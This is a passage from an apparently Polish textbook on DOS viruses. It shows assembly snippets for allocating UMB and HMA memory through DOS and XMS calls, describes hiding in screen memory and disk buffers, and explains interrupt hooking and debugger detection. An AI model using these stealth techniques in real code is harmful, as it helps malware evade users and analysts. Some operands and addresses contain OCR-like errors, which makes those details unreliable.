\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AX,5803h             ; funkcja DOS - do\uc1\u322\'b3\uc1\u261\'b9cz/od\uc1\u322\'b3\uc1\u261\'b9cz bloki UMB do \uc1\u322\'b3a\uc1\u324\'f1cucha MCB MOV BX,1                 ; podfunkcja - do\uc1\u322\'b3\uc1\u261\'b9cz bloki }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 21h                  ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AX,5801h             ; funkcja DOS - ustaw now\uc1\u261\'b9 strategi\uc1\u281\'ea pami\uc1\u281\'eaci }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV BX,82h               ; nowa strategia (UMB+ostatni spe\uc1\u322\'b3niaj\uc1\u261\'b9cy warunek) }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 21h                  ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch .......                  ; operacje na blokach MCB (na ca\uc1\u322\'b3ym ich \uc1\u322\'b3a\uc1\u324\'f1cuchu)}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch POP BX                   ; we\uc1\u378\'9f pierwotn\uc1\u261\'b9 informacj\uc1\u281\'ea o do\uc1\u322\'b3\uc1\u261\'b9czeniu pami\uc1\u281\'eaci UMB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch XOR BH,BH                ; podfunkcja - do\uc1\u322\'b3\uc1\u261\'b9cz bloki lub od\uc1\u322\'b3\uc1\u261\'b9cz zale\uc1\u380\'bfnie od BL MOV AX, 5803h            ; funkcja DOS - do\uc1\u322\'b3\uc1\u261\'b9cz/od\uc1\u322\'b3\uc1\u261\'b9cz bloki UMB do \uc1\u322\'b3a\uc1\u324\'f1cucha mcb INT 21H                  ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch POP BX                   ; przywr\'f3\uc1\u263\'e6 pierwotn\uc1\u261\'b9 strategi\uc1\u281\'ea}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AX,5801h             ; funkcja DOS - ustaw now\uc1\u261\'b9 strategi\uc1\u281\'ea pami\uc1\u281\'eaci wg BX }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 21h                  ; wywo\uc1\u322\'b3aj funkcj\uc1\u281\'ea DOS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Do\uc1\u322\'b3\uc1\u261\'b9czenie pami\uc1\u281\'eaci UMB do \uc1\u322\'b3a\uc1\u324\'f1cucha MCB ma du\uc1\u380\'bfe znaczenie, gdy poszukujemy ostatniego bloku w tym \uc1\u322\'b3a\uc1\u324\'f1cuchu. Je\uc1\u380\'bfeli system wykorzystuje pami\uc1\u281\'ea\uc1\u263\'e6 UMB, a ta nie jest chwilowo pod\uc1\u322\'b3\uc1\u261\'b9czona do \uc1\u322\'b3a\uc1\u324\'f1cucha MCB, zmiana ostatniego (w tym wypadku widzianego jako ostatni) bloku pami\uc1\u281\'eaci poni\uc1\u380\'bfej 640kB spowoduje odci\uc1\u281\'eaci}{\f1\fs24\lang1045{\*\listtag0}e}{\f0\fs24\lang1045{\*\listtag0} pami\uc1\u281\'eaci UMB, co w efekcie zmniejszy dost\uc1\u281\'eapn\uc1\u261\'b9 dla program\'f3w u\uc1\u380\'bfytkowych pami\uc1\u281\'ea\uc1\u263\'e6 i niechybnie pomo\uc1\u380\'bfe wykry\uc1\u263\'e6 intruza.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Innym sposobem na przydzielenie pami\uc1\u281\'eaci UMB wirusowi jest skorzystanie z mechanizm\'f3w zawartych w specyfikacji XMS, kt\'f3ra umo\uc1\u380\'bfliwia obs\uc1\u322\'b3ug\uc1\u281\'ea tej pami\uc1\u281\'eaci za po\uc1\u347\'9crednictwem funkcji l0h i 11h. S\uc1\u261\'b9 one dost\uc1\u281\'eapne przez bezpo\uc1\u347\'9crednie wywo\uc1\u322\'b3anie procedury, kt\'f3rej adres uzyskuje si\uc1\u281\'ea po wywo\uc1\u322\'b3aniu funkcji (4310/2F). Przydzielenie bloku UMB za pomoc\uc1\u261\'b9 funkcji XMS ilustruje poni\uc1\u380\'bfsza sekwencja:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch ; Wykorzystanie mechanizm\'f3w XMS do przydzia\uc1\u322\'b3u bloku UMB}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AX,4300H              ; funkcja - sprawd\uc1\u378\'9f, czy zainstalowany mened\uc1\u380\'bfer XMS }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 2Fh                   ; wywo\uc1\u322\'b3aj przerwanie multipleksowane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP AL,80h                ; czy zainstalowany mened\uc1\u380\'bfer XMS? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JNE NieMaXMS              ; skocz, je\uc1\u347\'9cli nie jest zainstalowany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AX,4310H              ; funkcja - we\uc1\u378\'9f adres procedury }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 2Fh                   ; wywo\uc1\u322\'b3aj przerwanie multipleksowane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV [PROCSEG],ES          ; zachowaj adres procedury mened\uc1\u380\'bfera XMS }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV [PROCOFS],BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AH,10h                ; funkcja XMS - przydziel pami\uc1\u281\'ea\uc1\u263\'e6 UMB }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV DX,rozmiar            ; podaj ilo\uc1\u347\'9c\uc1\u263\'e6 \uc1\u380\'bf\uc1\u261\'b9danej pami\uc1\u281\'eaci w paragrafach }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CALL [PROCSEG]            ; wywo\uc1\u322\'b3aj procedur\uc1\u281\'ea mened\uc1\u380\'bfera XMS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP AX,l                  ; je\uc1\u347\'9cli nie ma b\uc1\u322\'b3\uc1\u281\'eadu, to AX-1 }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JNE BLAD                  ; skocz, Je\uc1\u347\'9cli AX<>1 }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                           ; BX = adres przydzielonego bloku}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 5.4. Instalacja w pami\uc1\u281\'eaci HMA}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wykorzystuj\uc1\u261\'b9c wewn\uc1\u281\'eatrzne funkcje systemu DOS mo\uc1\u380\'bfna przydzieli\uc1\u263\'e6 sobie blok w pami\uc1\u281\'eaci HMA (ang. High Memory Area), znajduj\uc1\u261\'b9cej si\uc1\u281\'ea powy\uc1\u380\'bfej l Mb, a mo\uc1\u380\'bfliwej do zaadresowania w trybie rzeczywistym (np. ES:SI gdzie ES=SI=FFFF wskazuje na adres 10FFEF=lMb+64K-16 bajt\'f3w). Pami\uc1\u281\'ea\uc1\u263\'e6 ta jest najcz\uc1\u281\'ea\uc1\u347\'9cciej wykorzystywana przez DOS, aby zmniejszy\uc1\u263\'e6 ilo\uc1\u347\'9c\uc1\u263\'e6 pami\uc1\u281\'eaci konwencjonalnej, zaj\uc1\u281\'eatej przez}{\f1\fs24\lang1045{\*\listtag0} }{\f0\fs24\lang1045{\*\listtag0}system (to, czy system wykorzystuje HMA, zale\uc1\u380\'bfy od obecno\uc1\u347\'9cci polecenia DOS=HIGH w pliku CONFIG.SYS).}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Do przydzielania pami\uc1\u281\'eaci HMA wykorzystuje si\uc1\u281\'ea funkcje (4A01/4A02/2F) w postaci nast\uc1\u281\'eapuj\uc1\u261\'b9cej sekwencji:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                           ; Przydzia\uc1\u322\'b3 fragmentu pami\uc1\u281\'eaci HMA }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AX,4A01h              ; funkcja - sprawd\uc1\u378\'9f ilo\uc1\u347\'9c\uc1\u263\'e6 wolnej HMA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 2Fh                   ; wywo\uc1\u322\'b3aj przerwanie multipleksowane BX = ilo\uc1\u347\'9c\uc1\u263\'e6 wolnej          }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                           ; pami\uc1\u281\'eaci HMA w bajtach, }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                           ; ES:DI wskazuje na wolny obszar HMA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP BX, ROZMIAR           ; czy jest odpowiednia ilo\uc1\u347\'9c\uc1\u263\'e6 pami\uc1\u281\'eaci }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch jb NieMaHMA               ; je\uc1\u347\'9cli mniej, to nie przydzielaj }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AX, 4A02h             ; funkcja - przydziel pami\uc1\u281\'ea\uc1\u263\'e6 HMA }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV BX, ROZMIAR           ; rozmiar \uc1\u380\'bf\uc1\u261\'b9danej pami\uc1\u281\'eaci }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 2Fh                   ; wywo\uc1\u322\'b3aj przerwanie multipleksowane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab \tab               ; BX = ilo\uc1\u347\'9c\uc1\u263\'e6 przydzielonej pami\uc1\u281\'eaci HMA w paragrafach}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch \tab \tab               ; ES:DI wskazuje na przydzielony obszar HMA}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch NieMaHMA:}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Opr\'f3cz p}{\f0\fs24\lang1045{\*\listtag0}owy\uc1\u380\'bfszego sposobu istnieje jeszcze inna mo\uc1\u380\'bfliwo\uc1\u347\'9c\uc1\u263\'e6 przydzia\uc1\u322\'b3u pami\uc1\u281\'eaci HMA (ale tylko jako jednego bloku o d\uc1\u322\'b3ugo\uc1\u347\'9cci 64kB-16 bajt\'f3w, o ile nie jest ju\uc1\u380\'bf zaj\uc1\u281\'eaty). Nale\uc1\u380\'bfy skorzysta\uc1\u263\'e6 z mechanizmu oferowanego przez program obs\uc1\u322\'b3uguj\uc1\u261\'b9cy specyfikacj\uc1\u281\'ea XMS (najcz\uc1\u281\'ea\uc1\u347\'9ccie}{\f1\fs24\lang1045{\*\listtag0}j}{\f0\fs24\lang1045{\*\listtag0} HIMEM.SYS), tak jak pokazano to w poni\uc1\u380\'bfszym przyk\uc1\u322\'b3adzie:}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch                           ; Przydziel ca\uc1\u322\'b3e pami\uc1\u281\'ea\uc1\u263\'e6 HMA programowi}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AX,4300h              ; funkcja - sprawd\uc1\u378\'9f, czy zainstalowany mened\uc1\u380\'bfer XMS }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 2Fh                   ; wywo\uc1\u322\'b3aj przerwanie multipleksowane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP AL,80h                ; czy zainstalowany mened\uc1\u380\'bfer XMS ? }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JNE NieMaXMS              ; skocz, je\uc1\u347\'9cli nie jest zainstalowany}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AX,4310h              ; funkcja - we\uc1\u378\'9f adres procedury  }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch INT 2Fh                   ;  wywo\uc1\u322\'b3aj przerwanie multipleksowane}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV [PROCSEG],ES          ; zachowaj adres procedury mened\uc1\u380\'bfera XMS }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV [PROCOFS],BX}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV AH,l                  ; funkcja XMS - przydziel pami\uc1\u281\'ea\uc1\u263\'e6 HMA }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch MOV DX,ROZMIAR            ; podaj ilo\uc1\u347\'9c\uc1\u263\'e6 \uc1\u380\'bf\uc1\u261\'b9danej pami\uc1\u281\'eaci w bajtach }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CALL [PROCSEG]            ; wywo\uc1\u322\'b3aj procedur\uc1\u281\'ea mened\uc1\u380\'bfera XMS}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch CMP AX, l                 ; je\uc1\u347\'9cli nie ma b\uc1\u322\'b3\uc1\u281\'eadu, to AX=1 }{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch JNE BLAD                  ; skocz, je\uc1\u347\'9cli AX1}{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f2\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 5.5. Nietypowe metody instalacji }{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 5.5.1. Pami\uc1\u281\'ea\uc1\u263\'e6 ekranu}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Korzystaj\uc1\u261\'b9c z tego, i\uc1\u380\'bf tryby pracy ekranu nie wykorzystuj\uc1\u261\'b9 najcz\uc1\u281\'ea\uc1\u347\'9cciej ca\uc1\u322\'b3ej przeznaczonej dla danego trybu przestrzeni adresowej, mo\uc1\u380\'bfna u\uc1\u380\'bfy\uc1\u263\'e6 cz\uc1\u281\'ea\uc1\u347\'9cci pami\uc1\u281\'eaci ekranu, aby skopiowa\uc1\u263\'e6 tam wirusa. Wykorzystuje si\uc1\u281\'ea w tym celu najcz\uc1\u281\'ea\uc1\u347\'9cciej adresy w segmencie 0B000 lub 0B800 (zale\uc1\u380\'bfnie od karty graficznej), pod kt\'f3rymi ulokowane s\uc1\u261\'b9 dane }{\f1\fs24\lang1045{\*\listtag0}dla tryb\'f3w tekstowych ekranu.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 5.5.2. Bufory dyskowe DOS}{\f1\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Inn\uc1\u261\'b9, do\uc1\u347\'9c\uc1\u263\'e6 nietypow\uc1\u261\'b9 metod\uc1\u281\'ea na instalacj\uc1\u281\'ea w systemie znalaz\uc1\u322\'b3 i wykorzysta\uc1\u322\'b3 tw\'f3rca wirusa USSR.516. Wirus ten znajduje i alokuje sobie miejsce w jednym z bufor\'f3w stosowanych przez DOS przy operacjach dyskowych. Dzi\uc1\u281\'eaki temu, i\uc1\u380\'bf rezyduje w obszarach roboczych systemu, jest uznawany za jego cz\uc1\u281\'ea\uc1\u347\'9c\uc1\u263\'e6 oraz, co istotne, nie zmniejsza d\uc1\u322\'b3ugo\uc1\u347\'9cci pami\uc1\u281\'eaci dost\uc1\u281\'eapnej dla program\'f3w u\uc1\u380\'bfytkownika.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Przejmowanie przerwa\uc1\u324\'f1 jest najcz\uc1\u281\'ea\uc1\u347\'9cciej stosowan\uc1\u261\'b9 przez wirusy rezy-dentne metod\uc1\u261\'b9 kontrolowania dzia\uc1\u322\'b3ania systemu. Jak wspomniano w poprzednim rozdziale, procesory 80x86 mog\uc1\u261\'b9 obs\uc1\u322\'b3ugiwa\uc1\u263\'e6 do 256 przerwa\uc1\u324\'f1, kt\'f3rymi zajmuj\uc1\u261\'b9 si\uc1\u281\'ea osobne procedury obs\uc1\u322\'b3ugi. Adresy tych procedur zawarte s\uc1\u261\'b9 w tablicy przerwa\uc1\u324\'f1, kt\'f3ra w trybie rzeczywistym zaj}{\f1\fs24\lang1045{\*\listtag0}m}{\f0\fs24\lang1045{\*\listtag0}uje 1024 bajty pami\uc1\u281\'eaci i jest ulokowana w obszarze od adresu 0000:0000 do 0000:0400. Tablica ta zawiera 256 rekord\'f3w (ka\uc1\u380\'bfdy o d\uc1\u322\'b3ugo\uc1\u347\'9cci 4 bajt\'f3w) w postaci ofset:segment. Adres procedury obs\uc1\u322\'b3ugi przerwania o numerze 0h zajmuje wi\uc1\u281\'eac kom\'f3rki 0000:0000 -0000:}{\f1\fs24\lang1045{\*\listtag0}0}{\f0\fs24\lang1045{\*\listtag0}003, do przerwania 1h kom\'f3rki 0004:0007 itd. a\uc1\u380\'bf do przerwania 0FFh, zajmuj\uc1\u261\'b9cego kom\'f3rki 0000:03FC - 0000:03FF.}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\qc\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\abinodiroverride\ltrch ROZDZIA\uc1\u321\'a3 6}{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs28\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\b\lang1045{\*\listtag0}\abinodiroverride\ltrch 6.1. Najcz\uc1\u281\'ea\uc1\u347\'9cciej przejmowane i wykorzystywane przerwania}{\f0\fs24\b\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch Wirusy najcz\uc1\u281\'ea\uc1\u347\'9cciej wykorzystuj\uc1\u261\'b9 i/lub przejmuj\uc1\u261\'b9 nast\uc1\u281\'eapuj\uc1\u261\'b9ce przerwania:}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f1\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 0}{\f0\fs24\lang1045{\*\listtag0}1h - Przerwanie trybu krokowego procesora, wywo\uc1\u322\'b3ywane wewn\uc1\u281\'eatrznie, gdy w rejestrze znacznik\'f3w FLAGS jest ustawiony bit TF. Przerwanie Olh jest u\uc1\u380\'bfywane przez wirusy do poszukiwania w \uc1\u322\'b3a\uc1\u324\'f1cuchu procedur obs\uc1\u322\'b3ugi przerwania jego ostatniego elementu, b\uc1\u281\'ead\uc1\u261\'b9cego p}{\f1\fs24\lang1045{\*\listtag0}r}{\f0\fs24\lang1045{\*\listtag0}zewa\uc1\u380\'bfnie cz\uc1\u281\'ea\uc1\u347\'9cci\uc1\u261\'b9 DOS-a lub BIOS-a. W czasie wykonywania wy\uc1\u380\'bfej wymienionej operacji mo\uc1\u380\'bfliwe jest tak\uc1\u380\'bfe przej\uc1\u281\'eacie obs\uc1\u322\'b3ugi przerwania poprzez w\uc1\u322\'b3\uc1\u261\'b9czenie si\uc1\u281\'ea w istniej\uc1\u261\'b9cy \uc1\u322\'b3a\uc1\u324\'f1cuch obs\uc1\u322\'b3ugi przerwania, dzi\uc1\u281\'eaki czemu nie trzeba modyfikowa\uc1\u263\'e6 tablicy przerwa\uc1\u324\'f1. Kontrol}{\f1\fs24\lang1045{\*\listtag0}a}{\f0\fs24\lang1045{\*\listtag0} procedury obs\uc1\u322\'b3ugi tego przerwania pozwala wykry\uc1\u263\'e6 uruchomiony debugger.}{\f1\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch > 03h - Pu\uc1\u322\'b3apka programowa (ang. breakpoint\}, ze wzgl\uc1\u281\'eadu na 1-bajtow\uc1\u261\'b9 instrukcj\uc1\u281\'ea (kod 0CCh) stosowana przez debuggery;}{\f0\fs24\lang1045{\*\listtag0}\par}
\pard\plain\ltrpar\ql\sl240\slmult1\itap0{\f0\fs24\lang1045{\*\listtag0}\abinodiroverride\ltrch powy\uc1\u380\'bfsza w\uc1\u322\'b3a\uc1\u347\'9cciwo\uc1\u347\'9c\uc1\u263\'e6 powoduje, i\uc1\u380\'bf instrukcj\uc1\u281\'ea t\uc1\u281\'ea stosuj\uc1\u261\'b9 bardzo kr\'f3tkie wirusy do wywo\uc1\u322\'b3ywania pierwotnej procedury obs\uc1\u322\'b3ugi przej\uc1\u281\'eatego przez nie przerwania. Podobnie jak w przypadku przerwania numer 0lh, kontroluj\uc1\u261\'b9c INT 03h mo\uc1\u380\'bfna wykry\uc1\u263\'e6 w\uc1\u322\'b3\uc1\u261\'b9czony debugger.}{\f0\fs24\lang1045{\*\listtag0}\par}
